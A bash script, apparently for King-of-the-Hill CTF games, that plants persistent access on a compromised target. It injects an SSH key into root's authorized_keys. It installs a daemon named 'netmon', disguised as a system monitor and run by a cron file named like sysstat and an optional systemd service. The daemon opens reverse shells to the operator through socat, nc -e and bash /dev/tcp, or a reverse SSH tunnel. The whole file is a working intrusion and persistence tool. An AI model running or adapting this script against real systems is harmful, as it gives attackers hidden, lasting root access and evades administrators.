#!/bin/bash
# koth-continuity.sh — access continuity bridge for KoTH targets
#
# Installs a persistent return channel from the target back to the operator.
# Does NOT lock out other players, patch vulnerabilities, or modify the king
# service — R7 compliant (this is access continuity, not autohardening).
#
# Run this IMMEDIATELY after claiming king — don't wait to be kicked out.
#
# On-target artifacts use system-neutral names:
#   /usr/local/sbin/netmon          — reconnect daemon
#   /etc/cron.d/sysstat-collect     — cron schedule (every 60s)
#   /run/netmon.pid                 — runtime PID file
#   /etc/systemd/system/system-netmon.service  (--service only)
#   /root/.ssh/._nm_id[.pub]        (--ssh-tunnel only — tunnel keypair)
#
# Modes (auto-selected by reachability probe):
#   --ssh-tunnel    SSH reverse tunnel (R-forward) — used when target can reach us.
#                   On THM this usually fails (VPN is inbound-only). Script auto-detects.
#   default (raw)   socat → nc → bash /dev/tcp — used when target can reach our port.
#   --key-only      SSH key injection only — always works; direct SSH forward access.
#                   Auto-selected when neither reverse channel can reach us.
#
# Usage (minimal — runs immediately after king claim):
#   koth-continuity.sh -t TARGET -i ROOT_SSH_KEY [-L LHOST]
#
# If -L is omitted, script auto-detects tun0 IP and probes reachability.
# If target can't reach us (THM architecture), falls back to --key-only automatically.
#
# Listener (raw mode) — run on your Kali before or after deploy:
#   socat file:`tty`,raw,echo=0 tcp-listen:PORT,reuseaddr
#   nc -lvnp PORT
#
# Connect back (--ssh-tunnel mode):
#   ssh -p TUNNEL_PORT root@localhost
#
# Options:
#   -t  TARGET        KoTH target IP (required)
#   -i  SSH_KEY       SSH private key to reach target (required)
#   -u  SSH_USER      SSH user (default: root)
#   -L  LHOST         Our IP for callbacks (auto-detect tun0 if omitted)
#   -P  LPORT         Callback port / tunnel local port (default: 4444)
#   -k  PUBKEY        Our pubkey to inject (default: <SSH_KEY>.pub)
#   --ssh-tunnel      Force SSH reverse tunnel mode
#   --tunnel-port N   Port forwarded on operator side (default: 12222)
#   --tunnel-user U   SSH user on operator machine (default: $USER)
#   --service         Also install system-netmon.service (Restart=always)
#   --key-only        SSH key injection only — skip reverse channel deploy
#   --no-key-inject   Skip authorized_keys injection
#   --listen          Start local listener after deploy (raw mode only; blocks)
#   --remove          Remove our continuity components from target
#   --verbose
#   --log FILE

set -uo pipefail

# ─── Defaults ────────────────────────────────────────────────────────────────
TARGET=""
SSH_KEY=""
SSH_USER="root"
LHOST=""
LPORT=4444
PUBKEY=""
DO_SSH_TUNNEL=0
TUNNEL_PORT=12222
TUNNEL_USER="${USER:-root}"
DO_SERVICE=0
DO_KEY_INJECT=1
DO_KEY_ONLY=0
DO_LISTEN=0
DO_REMOVE=0
VERBOSE=0
LOG_FILE=""
REACH_CHECKED=0
TARGET_CAN_REACH=0
DEFAULT_CTF_KEY="${CTF_ROOT:-.}/.ssh/ctf_koth_root_ed25519"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; BLU='\033[0;34m'
CYN='\033[0;36m'; NC='\033[0m'
ts()   { date '+%H:%M:%S'; }
info() { local m="[$(ts)][*] $*"; echo -e "${BLU}${m}${NC}"; [[ -n "$LOG_FILE" ]] && echo "$m" >> "$LOG_FILE"; }
ok()   { local m="[$(ts)][+] $*"; echo -e "${GRN}${m}${NC}"; [[ -n "$LOG_FILE" ]] && echo "$m" >> "$LOG_FILE"; }
warn() { local m="[$(ts)][!] $*"; echo -e "${YLW}${m}${NC}"; [[ -n "$LOG_FILE" ]] && echo "$m" >> "$LOG_FILE"; }
err()  { local m="[$(ts)][-] $*"; echo -e "${RED}${m}${NC}"; [[ -n "$LOG_FILE" ]] && echo "$m" >> "$LOG_FILE"; }

# ─── Arg parse ───────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t)             TARGET="$2"; shift 2 ;;
    -i)             SSH_KEY="$2"; shift 2 ;;
    -u)             SSH_USER="$2"; shift 2 ;;
    -L)             LHOST="$2"; shift 2 ;;
    -P)             LPORT="$2"; shift 2 ;;
    -k)             PUBKEY="$2"; shift 2 ;;
    --ssh-tunnel)   DO_SSH_TUNNEL=1; shift ;;
    --tunnel-port)  TUNNEL_PORT="$2"; shift 2 ;;
    --tunnel-user)  TUNNEL_USER="$2"; shift 2 ;;
    --service)      DO_SERVICE=1; shift ;;
    --no-key-inject) DO_KEY_INJECT=0; shift ;;
    --key-only)     DO_KEY_ONLY=1; shift ;;
    --listen)       DO_LISTEN=1; shift ;;
    --remove)       DO_REMOVE=1; shift ;;
    --verbose)      VERBOSE=1; shift ;;
    --log)          LOG_FILE="$2"; shift 2 ;;
    -h|--help) grep '^#' "$0" | head -50 | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) err "Unknown arg: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { err "-t TARGET required"; exit 1; }
if [[ -z "$SSH_KEY" ]] && [[ -f "$DEFAULT_CTF_KEY" ]]; then
  SSH_KEY="$DEFAULT_CTF_KEY"
  info "Defaulting SSH key to repo key: $SSH_KEY"
fi
if [[ "$SSH_KEY" == *personal_or_lan_key* ]]; then
  err "Refusing non-CTF personal key: $SSH_KEY"
  err "Use a key under ${CTF_ROOT:-.}/.ssh/ instead."
  exit 1
fi
[[ -z "$SSH_KEY" ]] && { err "-i SSH_KEY required (or place default at $DEFAULT_CTF_KEY)"; exit 1; }

# Auto-detect LHOST from tun0 if not provided
if [[ -z "$LHOST" ]] && [[ $DO_REMOVE -eq 0 ]] && [[ $DO_KEY_ONLY -eq 0 ]]; then
  LHOST=$(ip addr show tun0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
  if [[ -z "$LHOST" ]]; then
    warn "tun0 not found — using key-only mode (direct SSH access only)"
    DO_KEY_ONLY=1
  else
    info "Auto-detected LHOST from tun0: $LHOST"
  fi
fi
[[ -z "$LOG_FILE" ]] && LOG_FILE="/tmp/koth_continuity_${TARGET}.log"
[[ -z "$PUBKEY" ]] && PUBKEY="${SSH_KEY}.pub"

SSH_OPTS="-i $SSH_KEY -l $SSH_USER \
  -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=yes \
  -o LogLevel=ERROR -o ServerAliveInterval=10 -o ServerAliveCountMax=2"

ssh_run() { ssh $SSH_OPTS "$TARGET" "$1" 2>/dev/null || true; }

# ─── Validate connection ──────────────────────────────────────────────────────
info "Checking SSH connectivity to $SSH_USER@$TARGET ..."
if ! ssh_run "echo ok" | grep -q "ok"; then
  err "SSH to $TARGET failed — check key/user/connectivity"
  exit 1
fi
ok "SSH OK"

# ─── Reachability probe (skip in key-only / remove mode) ─────────────────
# Check if the target can actually reach our LHOST before deploying reverse channels.
# THM VPN is typically inbound-only — target can't dial back to tun0.
# If probe fails, auto-downgrade to key-only (direct SSH forward access).
if [[ $DO_KEY_ONLY -eq 0 ]] && [[ $DO_REMOVE -eq 0 ]] && [[ -n "$LHOST" ]]; then
  info "Probing reverse reachability: target → $LHOST:${LPORT} ..."
  reach_result=$(ssh_run "nc -zw3 ${LHOST} ${LPORT} 2>&1; echo rc=\$?" 2>/dev/null || echo "rc=1")
  if echo "$reach_result" | grep -q "rc=0"; then
    TARGET_CAN_REACH=1
    ok "Reverse channel reachable — deploying reverse shell"
  else
    warn "Target cannot reach $LHOST:$LPORT (THM inbound-only VPN?)"
    # Try SSH tunnel port as a second test
    if [[ $DO_SSH_TUNNEL -eq 1 ]]; then
      reach_ssh=$(ssh_run "nc -zw3 ${LHOST} 22 2>&1; echo rc=\$?" 2>/dev/null || echo "rc=1")
      if echo "$reach_ssh" | grep -q "rc=0"; then
        TARGET_CAN_REACH=1
        ok "SSH port reachable — keeping --ssh-tunnel mode"
      else
        warn "SSH port ($LHOST:22) also unreachable — downgrading to key-only mode"
        DO_KEY_ONLY=1
        DO_SSH_TUNNEL=0
      fi
    else
      warn "Downgrading to key-only mode (direct SSH forward access)"
      DO_KEY_ONLY=1
    fi
  fi
fi

if [[ $DO_KEY_ONLY -eq 1 ]] && [[ $DO_REMOVE -eq 0 ]]; then
  info "Key-only mode: injecting access key — reconnect with: ssh -i $SSH_KEY $SSH_USER@$TARGET"
fi

# ═══════════════════════════════════════════════════════════════════════════
# REMOVE MODE
# ═══════════════════════════════════════════════════════════════════════════
if [[ $DO_REMOVE -eq 1 ]]; then
  info "Removing continuity components from $TARGET ..."
  ssh_run "
    # Kill running netmon
    pid=\$(cat /run/netmon.pid 2>/dev/null)
    [ -n \"\$pid\" ] && kill \"\$pid\" 2>/dev/null
    rm -f /run/netmon.pid
    # Remove cron entry
    rm -f /etc/cron.d/sysstat-collect
    # Remove daemon script
    rm -f /usr/local/sbin/netmon
    # Remove systemd service
    systemctl stop system-netmon.service 2>/dev/null
    systemctl disable system-netmon.service 2>/dev/null
    rm -f /etc/systemd/system/system-netmon.service
    systemctl daemon-reload 2>/dev/null
    # Remove tunnel key from target
    rm -f /root/.ssh/._nm_id /root/.ssh/._nm_id.pub
    # Remove our injected pubkey from authorized_keys
    sed -i '/nm_bridge/d' /root/.ssh/authorized_keys 2>/dev/null
    echo done
  " | grep -q "done" && ok "Continuity components removed from $TARGET" || warn "Partial removal — check manually"

  # Remove tunnel key from our local authorized_keys
  if [[ -f ~/.ssh/authorized_keys ]]; then
    sed -i '/nm_bridge/d' ~/.ssh/authorized_keys
    ok "Removed nm_bridge key from local authorized_keys"
  fi
  exit 0
fi

# ═══════════════════════════════════════════════════════════════════════════
# DEPLOY MODE
# ═══════════════════════════════════════════════════════════════════════════

# ─── Step 1: Inject our public key ────────────────────────────────────────
if [[ $DO_KEY_INJECT -eq 1 ]]; then
  if [[ ! -f "$PUBKEY" ]]; then
    warn "Pubkey not found at $PUBKEY — skipping key injection"
  else
    local_pubkey=$(cat "$PUBKEY")
    ssh_run "
      mkdir -p /root/.ssh && chmod 700 /root/.ssh
      grep -qF 'nm_bridge' /root/.ssh/authorized_keys 2>/dev/null || \
        echo '${local_pubkey} nm_bridge' >> /root/.ssh/authorized_keys
      chmod 600 /root/.ssh/authorized_keys
      echo injected
    " | grep -q "injected" && ok "Pubkey injected into /root/.ssh/authorized_keys" \
      || warn "Key injection may have failed — verify manually"
  fi
fi

# ─── Steps 2-6: Reverse channel (skip in key-only mode) ──────────────────
if [[ $DO_KEY_ONLY -eq 1 ]]; then
  echo ""
  ok "═══ Key-only continuity deployed to $TARGET ═══"
  echo -e "${CYN}  Mode    : Direct SSH forward (reverse channel unavailable)${NC}"
  echo -e "${CYN}  Connect : ssh -i $SSH_KEY $SSH_USER@$TARGET${NC}"
  echo -e "${CYN}  Remove  : $0 -t $TARGET -i $SSH_KEY --remove${NC}"
  echo ""
  exit 0
fi

# ─── Step 2: Build on-target netmon script ────────────────────────────────
if [[ $DO_SSH_TUNNEL -eq 1 ]]; then
  # ── SSH reverse tunnel mode ──────────────────────────────────────────────
  # Generate a dedicated keypair for the tunnel (don't reuse the operator key)
  TUNNEL_KEY_LOCAL="/tmp/._nm_tunnel_key_${TARGET//./_}"
  if [[ ! -f "$TUNNEL_KEY_LOCAL" ]]; then
    info "Generating tunnel keypair ..."
    ssh-keygen -t ed25519 -f "$TUNNEL_KEY_LOCAL" -N "" -C "nm_bridge" -q 2>/dev/null
  fi
  TUNNEL_PUBKEY=$(cat "${TUNNEL_KEY_LOCAL}.pub")

  # Add tunnel pubkey to OUR authorized_keys with port-restriction
  # This key can only open a remote forward to TUNNEL_PORT — nothing else
  TUNNEL_AK_ENTRY="no-pty,no-X11-forwarding,no-agent-forwarding,permitopen=\"localhost:${TUNNEL_PORT}\" ${TUNNEL_PUBKEY}"
  if ! grep -qF "nm_bridge" ~/.ssh/authorized_keys 2>/dev/null; then
    echo "$TUNNEL_AK_ENTRY" >> ~/.ssh/authorized_keys
    ok "Tunnel pubkey added to ~/.ssh/authorized_keys (restricted)"
  else
    ok "Tunnel pubkey already present in ~/.ssh/authorized_keys"
  fi

  # Encode the private key for transport
  TUNNEL_KEY_B64=$(base64 -w0 < "$TUNNEL_KEY_LOCAL")

  NETMON_SCRIPT="#!/bin/sh
# netmon — system network connectivity monitor
PIDFILE=/run/netmon.pid
LHOST=${LHOST}
LPORT=${TUNNEL_PORT}
LUSER=${TUNNEL_USER}
KEY=/root/.ssh/._nm_id

# Already running?
if [ -f \"\$PIDFILE\" ]; then
  pid=\$(cat \"\$PIDFILE\")
  kill -0 \"\$pid\" 2>/dev/null && exit 0
fi

ssh -o StrictHostKeyChecking=no \\
    -o BatchMode=yes \\
    -o ExitOnForwardFailure=yes \\
    -o ServerAliveInterval=30 \\
    -o ServerAliveCountMax=3 \\
    -o ConnectTimeout=10 \\
    -i \"\$KEY\" \\
    -R \"\${LPORT}:localhost:22\" \\
    \"\${LUSER}@\${LHOST}\" \\
    -N 2>/dev/null &
echo \$! > \"\$PIDFILE\""

  # Deploy tunnel private key on target
  ssh_run "
    echo '${TUNNEL_KEY_B64}' | base64 -d > /root/.ssh/._nm_id
    chmod 600 /root/.ssh/._nm_id
    echo keyed
  " | grep -q "keyed" && ok "Tunnel private key installed on target" || warn "Key install failed"

  CONNECT_HINT="ssh -p ${TUNNEL_PORT} ${SSH_USER}@localhost  # on your Kali after target connects back"

else
  # ── Raw reverse shell mode ───────────────────────────────────────────────
  NETMON_SCRIPT="#!/bin/sh
# netmon — system network connectivity monitor
PIDFILE=/run/netmon.pid
LHOST=${LHOST}
LPORT=${LPORT}

# Already running?
if [ -f \"\$PIDFILE\" ]; then
  pid=\$(cat \"\$PIDFILE\")
  kill -0 \"\$pid\" 2>/dev/null && exit 0
fi

# Try socat (full pty — preferred)
if command -v socat >/dev/null 2>&1; then
  socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:\"\${LHOST}\":\"\${LPORT}\" >/dev/null 2>&1 &
  echo \$! > \"\$PIDFILE\"
  exit 0
fi
# Try ncat/nc with -e
if command -v nc >/dev/null 2>&1 && nc -h 2>&1 | grep -q '\\-e'; then
  nc \"\${LHOST}\" \"\${LPORT}\" -e /bin/bash >/dev/null 2>&1 &
  echo \$! > \"\$PIDFILE\"
  exit 0
fi
# Bash /dev/tcp fallback
bash -i >& /dev/tcp/\${LHOST}/\${LPORT} 0>&1 &
echo \$! > \"\$PIDFILE\""

  CONNECT_HINT="socat file:\`tty\`,raw,echo=0 tcp-listen:${LPORT},reuseaddr  # on your Kali"
fi

# ─── Step 3: Deploy netmon script on target ───────────────────────────────
NETMON_B64=$(printf '%s' "$NETMON_SCRIPT" | base64 -w0)
ssh_run "
  echo '${NETMON_B64}' | base64 -d > /usr/local/sbin/netmon
  chmod 700 /usr/local/sbin/netmon
  echo deployed
" | grep -q "deployed" && ok "netmon deployed to /usr/local/sbin/netmon" \
  || { err "netmon deploy failed"; exit 1; }

# ─── Step 4: Install cron entry ───────────────────────────────────────────
CRON_ENTRY="* * * * * root /usr/local/sbin/netmon >/dev/null 2>&1"
ssh_run "
  echo '${CRON_ENTRY}' > /etc/cron.d/sysstat-collect
  chmod 644 /etc/cron.d/sysstat-collect
  echo cronok
" | grep -q "cronok" && ok "Cron entry installed: /etc/cron.d/sysstat-collect" \
  || warn "Cron install may have failed"

# ─── Step 5 (optional): Systemd service ──────────────────────────────────
if [[ $DO_SERVICE -eq 1 ]]; then
  SVC_CONTENT="[Unit]
Description=System Network Monitor
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/sbin/netmon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"
  SVC_B64=$(printf '%s' "$SVC_CONTENT" | base64 -w0)
  ssh_run "
    echo '${SVC_B64}' | base64 -d > /etc/systemd/system/system-netmon.service
    systemctl daemon-reload 2>/dev/null
    systemctl enable --now system-netmon.service 2>/dev/null
    echo svcok
  " | grep -q "svcok" && ok "system-netmon.service installed and started" \
    || warn "Service install may have failed"
fi

# ─── Step 6: Fire the first connection immediately (don't wait for cron) ──
info "Triggering immediate first connection ..."
ssh_run "/usr/local/sbin/netmon >/dev/null 2>&1 &" || true
sleep 1

# ─── Summary ─────────────────────────────────────────────────────────────
echo ""
ok "═══ Continuity bridge deployed to $TARGET ═══"
echo -e "${CYN}  Mode     : $([ $DO_SSH_TUNNEL -eq 1 ] && echo 'SSH reverse tunnel' || echo 'Raw reverse shell')${NC}"
echo -e "${CYN}  Schedule : cron every 60s (/etc/cron.d/sysstat-collect)${NC}"
[[ $DO_SERVICE -eq 1 ]] && echo -e "${CYN}  Service  : system-netmon.service (Restart=always)${NC}"
echo -e "${CYN}  Connect  : ${CONNECT_HINT}${NC}"
echo -e "${CYN}  Remove   : $0 -t $TARGET -i $SSH_KEY --remove${NC}"
echo ""

# ─── Step 7 (optional): Start local listener ─────────────────────────────
if [[ $DO_LISTEN -eq 1 ]] && [[ $DO_SSH_TUNNEL -eq 0 ]]; then
  ok "Starting local listener on :${LPORT} (blocking — Ctrl-C to exit)"
  if command -v socat &>/dev/null; then
    socat file:"$(tty)",raw,echo=0 tcp-listen:"${LPORT}",reuseaddr
  else
    nc -lvnp "${LPORT}"
  fi
fi
